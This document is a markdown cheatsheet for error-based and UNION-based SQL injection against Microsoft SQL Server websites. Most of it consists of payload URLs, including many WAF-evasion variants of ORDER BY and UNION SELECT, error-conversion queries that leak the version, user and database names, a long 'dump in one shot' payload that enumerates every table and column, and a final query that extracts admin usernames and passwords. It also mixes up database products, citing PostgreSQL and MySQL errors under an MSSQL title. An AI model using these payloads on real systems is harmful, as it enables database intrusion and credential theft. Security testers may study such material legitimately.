# MSSQL Error Based SQL Injection Cheatsheet
This is probably the easiest vulnerability along the SQL Injection attack. An attacker can enumerate and dump the PostgreSQL database by using the SQL error messages to his advantage.

## Detecting the vulnerability

```http://domain.com/index.php?id=1```  
Website loads successfully  

```http://domain.com/index.php?id=1'```   
Error message shows up: ```You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...```  

```http://domain.com/index.php?id=1\'```   
Error message shows up: ```You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...```  

```http://domain.com/index.php?id=2-1```  
Website loads successfully

```http://domain.com/index.php?id=-1'```  
Error message shows up again

```http://domain.com/index.php?id=-1)'```  
Error message shows up again

```http://domain.com/index.php?id=1'-- -```  
Website might loads successfuly, but it might shows error also

```http://domain.com/index.php?id=1'--```  
Website might loads successfuly, but it might shows error also

```http://domain.com/index.php?id=1+--+```  
Website might loads successfuly, but it might shows error also

## Bypassing WAF to detect the vulnerability (if the first methodology didn't work)

In some cases, WAF won't let you to cause errors on the website, so sending special queries might be needed to bypass WAF.

```http://domain.com/index.php?id=1'--/**/-```  
If no WAF Warning is shown and website loads up, we confirm the vulnerability, else try the following payloads.

```http//domain.com/index.php?id=/^.*1'--+-.*$/```  
```http//domain.com/index.php?id=/*!500001'--+-*/```  
```http//domain.com/index.php?id=1'--/**/-```  
```http//domain.com/index.php?id=1'--/*--*/-```  
```http//domain.com/index.php?id=1'--/*&a=*/-```  
```http//domain.com/index.php?id=1'--/*1337*/-```  
```http//domain.com/index.php?id=1'--/**_**/-```  
```http//domain.com/index.php?id=1'--%0A-```  
```http//domain.com/index.php?id=1'--%0b-```  
```http//domain.com/index.php?id=1'--%0d%0A-```  
```http//domain.com/index.php?id=1'--%23%0A-```  
```http//domain.com/index.php?id=1'--%23foo%0D%0A-```  
```http//domain.com/index.php?id=1'--%23foo*%2F*bar%0D%0A-```  
```http//domain.com/index.php?id=1'--#qa%0A#%0A-```  
```http//domain.com/index.php?id=/*!20000%0d%0a1'--+-*/```  
```http//domain.com/index.php?id=/*!blobblobblob%0d%0a1'--+-*/```  

## Find the number of columns using 'ORDER BY' query  

Now that we performed an SQL syntax error to the website, we can begin fuzzing and finding how many columns do we have by using ORDER BY

```http://domain.com/index.php?id=1' order by 1-- -```  
This query musn't shows up error, since there is no lower number than 1  

- If the payload shows up error, try setting a negative value:  
```http://domain.com/index.php?id=-1' order by 1-- -```  
This query musn't shows up error, since there is no lower number than 1  

  - If the payload shows up error, try removing the quote which might cause SQL error:
  ```http://domain.com/index.php?id=605 order by 1-- -```  
  ```http://domain.com/index.php?id=-605 order by 1-- -```  
 These both queries musn't shows up error. If error is still ocurring, try the following payloads:

    - If both of payloads don't work, it is problably a WAF blocking it. Try the following blocks until you won't see WAF detection or SQL syntax error.  
```http://domain.com/index.php?id=1' order by 1 desc-- -```  
```http://domain.com/index.php?id=1' group by 1-- -```  
```http://domain.com/index.php?id=1' group by 1-- -```  
```http://domain.com/index.php?id=1' /**/ORDER/**/BY/**/ 1-- -```  
```http://domain.com/index.php?id=-1' /*!order*/+/*!by*/ 1-- -```  
```http://domain.com/index.php?id=1' /*!ORDER BY*/ 1-- -```  
```http://domain.com/index.php?id=1'/*!50000ORDER*//**//*!50000BY*/ 1-- -```  
```http://domain.com/index.php?id=1' /*!12345ORDER*/+/*!BY*/ 1-- -```  
```http://domain.com/index.php?id=1' /*!50000ORDER BY*/ 1-- -```  
```http://domain.com/index.php?id=1' order/**_**/by 1-- -```  
```http://domain.com/index.php?id=1\ order by 1-- -```  
```http://domain.com/index.php?id=1' order by 1 asc-- -```  
```http://domain.com/index.php?id=1' group by 1 asc-- -```  
```http://domain.com/index.php?id=1' AND 0 order by 1-- -```  
    
    - If none of the payloads didn't bypass WAF, try again the payloads by following the 2 rules below:
      - Add a minus (-) before 1 (example: ```?id=-1' /**/ORDER/**/BY/**/ 1-- -```)  
      - Remove the quote (') after the parameter value (example: ```?id=1 /**/ORDER/**/BY/**/ 1-- -```)

In this case, the payload ```?id=1 order by 1-- -``` worked and website loads successfuly. Now it is time to find the correct number of columns. Now let's use the payload that worked, and try increasing the number by 1, untill an error shows up: 

```http://domain.com/index.php?id=1 order by 1-- -``` no error  
```http://domain.com/index.php?id=1 order by 2-- -```  no error  
```http://domain.com/index.php?id=1 order by 3-- -```  no error  
```http://domain.com/index.php?id=1 order by 4-- -```  no error  
```http://domain.com/index.php?id=1 order by 5-- -```  error: ```Unknown column '5' in 'order clause'Unknown column '5' in 'order clause'```  

This means there are only 4 columns. Now we have to find which one of these 4 columns have information.  

## Find the vulnerable column where information are stored using 'UNION SELECT' query  

Using a simple query, we determine which of the 4 columns reflect our input using. Only 1 of these payloads will run without **syntax error**. *NOTE: If none worked, try the same payloads, but remove the quote (') after number 1.*    

```http://domain.com/index.php?id=1' Union Select 1,2,3,4-- -```  
```http://domain.com/index.php?id=-1 Union Select 1,2,3,4-- -```  
```http://domain.com/index.php?id=-1' Union Select 1,2,3,4-- -```  
```http://domain.com/index.php?id=1'+UNION+ALL+SELECT+null,null,null,null--+-```  
```http://domain.com/index.php?id=1' Union Select null,2,3,4-- -```  
```http://domain.com/index.php?id=1' Union Select 1,null,3,4-- -```  
```http://domain.com/index.php?id=1' Union Select 1,2,null,4-- -```  
```http://domain.com/index.php?id=1' Union Select 1,2,3,null-- -```  
```http://domain.com/index.php?id=.1' Union Select 1,2,3,4-- -```  
```http://domain.com/index.php?id=-1' div 0' Union Select 1,2,3,4-- -```  
```http://domain.com/index.php?id=1' Union Select 1,2,3,4 desc-- -```  
```http://domain.com/index.php?id=1' AND 0 Union Select 1,2,3,4-- -```  

Website must successfully load and we will see a number (in our case between 1-4)  

  - If the queries will not work, try the following payloads until you see the number:  
  
```http://domain.com/index.php?id=1+UNION+SELECT+1,2,3,4--+-```  
```http://domain.com/index.php?id=1+UNION+ALL+SELECT+1,2,3,4--+-```  
```http://domain.com/index.php?id=1+UNION+ALL+SELECT+1,2,3,4--+-```  
```http://domain.com/index.php?id=1+UNION+ALL+SELECT+null,null,null,null--+-```  
```http://domain.com/index.php?id=1 UNION(SELECT(1),(2),(3),(4))-- -```  
```http://domain.com/index.php?id=1 +Union Distinctrow Select+1,2,3,4-- -```  
```http://domain.com/index.php?id=1+UNION+ALL+SELECT+13371,13372,13373,13374--+-```  
```http://domain.com/index.php?id=1+UNION+ALL+SELECT+1%2c2%2c3%2c4--+-```  
```http://domain.com/index.php?id=1 Union Select CHAR(49),CHAR(50),CHAR(51),CHAR(52)-- -```  
```http://domain.com/index.php?id=1 %23%0AUnion%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0ASelect%23%0A1,2,3,4-- -``` (buffer by a * 300)  
 ```http://domain.com/index.php?id=Union Select * from (select 1)a join(select 2)b join(select 3)c join(select 4)d-- -```  

    - If the queries still doesn't show the vulnerable column number, it is probably the WAF blocking our queries. Let's try injection payloads which bypass it.   
    
    http://domain.com/index.php?id=1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %55nion(%53elect 1,2,3) 1,2,3,4-- -  
    http://domain.com/index.php?id=1+union+distinctROW+select+1,2,3,4--+-  
    http://domain.com/index.php?id=1+ #?uNiOn + #?sEleCt 1,2,3,4-- -  
    http://domain.com/index.php?id=1 + #?1q %0AuNiOn all#qa%0A#%0AsEleCt 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!%55NiOn*/ /*!%53eLEct*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +un/**/ion+se/**/lect 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +?UnI?On?+'SeL?ECT? 1,2,3,4-- -  
    http://domain.com/index.php?id=1+(UnIoN)+(SelECT)+1,2,3,4--+-  
    http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %55nion(%53elect 1,2,3,4)-- -  
    http://domain.com/index.php?id=1 /**//*!12345UNION SELECT*//**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**//*!50000UNION SELECT*//**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**/UNION/**//*!50000SELECT*//**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!50000UniON SeLeCt*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union /*!50000%53elect*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*--*/union/*--*/select/*--*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union (/*!/**/ SeleCT */ 1,2,3,4)-- -  
    http://domain.com/index.php?id=1 /*!union*/+/*!select*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**/uNIon/**/sEleCt/**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +%2F**/+Union/*!select*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**//*!union*//**//*!select*//**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!uNIOn*/ /*!SelECt*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**/union/*!50000select*//**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 0%a0union%a0select%09 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %0Aunion%0Aselect%0A 1,2,3,4-- -  
    http://domain.com/index.php?id=1 uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!union*//*--*//*!all*//*--*//*!select*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4-- -
    http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union+sel%0bect 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +#1q%0Aunion all#qa%0A#%0Aselect 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %23xyz%0AUnIOn%23xyz%0ASeLecT+ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %23xyz%0A%55nIOn%23xyz%0A%53eLecT+ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union(select(1),2,3)-- -  
    http://domain.com/index.php?id=1 uNioN (/*!/**/ SeleCT */ 11) 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +/*!UnIoN*/+/*!SeLeCt*/+ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 uni%20union%20/*!select*/%20 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union%23aa%0Aselect 1,2,3,4-- -  
    http://domain.com/index.php?id=1/**/union/*!50000select*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /^****union.*$/ /^****select.*$/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*union*/union/*select*/select+ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!50000UnION*//*!50000SeLeCt*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %252f%252a*/union%252f%252a /select%252f%252a*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 AnD null UNiON SeLeCt 1,2,3,4;%00-- -  
    http://domain.com/index.php?id=1 AnD null UNiON SeLeCt 1,2,3,4+--+-  
    http://domain.com/index.php?id=1 And False Union Select 1,2,3,4+--+-  
    

We bypassed the WAF and found that the 3nd column has the information.

## Dumping database (Boolean string)

```http://domain.com/index.php?id=1'and 1=convert(int,@@version)--```  
```http://domain.com/index.php?id=1'and 1=cast(@@version as int)-- -```  
Both payloads will return the same error, with the version output.  
>Error: Warning: mssql_query() message: COnversion failed when converting the nvarchar value "**Microsoft SQL Server 2012 (SP1) - 110.0.3156.0 (X64) Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.2 X64 (Build 9200: ) (Hypervisor)**" to data type int. (severity 16 in D:\something\web\STD\...\id.php on line...

```http://domain.com/index.php?id=1'and 1=convert(int,user_name())--```  
```http://domain.com/index.php?id=1'and 1=cast(user_name as int)-- -```  
Both payloads will return the same error, with the version output.  
>Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**admin_user**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...

```http://domain.com/index.php?id=1'and 1=convert(int,@@SERVERNAME())--```  
```http://domain.com/index.php?id=1'and 1=cast(@@SERVERNAME as int)-- -```  
Both payloads will return the same error, with the server name output.  
>Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**SERVER_NAME_HERE**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...

```http://domain.com/index.php?id=1'and 1=convert(int,db_name())--```  
```http://domain.com/index.php?id=1'and 1=cast(db_name() as int)-- -```  
Both payloads will return the same error, with the database name output.  
>Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**store_database**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...

## Dumping database (UNION based query)

Use the union query which worked, in this case I bypassed WAF and found that the 3rd column is vulnerable with payload:  
```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -```  

Becasue of the 3rd column, replace number **3** with the following payloads to retrieve informations:

```
@@version  
db_name()  
user_name()
```

Example:  
Retrieve database version:  
```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,@@version,4-- -```  
Look at the error message, the version will be displayed there.  

Retrieve database name:  
```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,db_name(),4-- -```  
Look at the error message, the database name will be displayed there.  

Retrieve username of database:  
```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,user_name(),4-- -```  
Look at the error message, the database username will be displayed there.  

## Dumping database with DIOS

#### What is DIOS?

DIOS (dump in one shot), is a long crafted payload which will dump database(), tables() and columns() and will display it in the website.  

- Here is a list of MSSQL DIOS payloads:

```
;begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Chall1 END--
```

#### How to use DIOS?

- This is a special case where DIOS store the payload into an environment variable. We will use the UNION based payload which we found the vulnerable column, this case we used:  
```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -```  

- Delete every number and **-- -** from the payload, so the payload will look like:  
```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/```  

- Right in the end of the payload add the DIOS payload:  

```
http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ ;begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Kleiton0x00 END--
```  
- No output will be displayed because it is stored into an environment variable. We can access it by using one of the 2 following payload:  
  
  Union based query:  
  ```http://domain.com/index.php?id=1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,output,4-- -```  

  Boolean based query:  
  ```http://domain.com/index.php?id=1' and 1=cast(select output from Kleiton0x00)-- -```  

*NOTE: Replace the vulnerable column number (this case it was **3**). The number is found with UNION based payloads we did on the previous step.*  

- Look at the error message/website, the retrieved informations are shown.

![dios_dumped_db](https://i.imgur.com/OmWEciR.jpg)  

### Dumping data inside columns

We know what the tables and columns are (from DIOS or manual dumping), however DIOS is much more recommended as it saves time and effort.

This is a piece of the whole database that we will dump:

**Table name**: *AdminLogin*  
**Columns**: *username*, *password* 

```http://domain.com/index.php?id=1' and 1=(select username %2b ':' %2b password from AdminLogin for xml PATH("))-- -```

![column_dumped](https://i.imgur.com/OwfunVg.jpg)
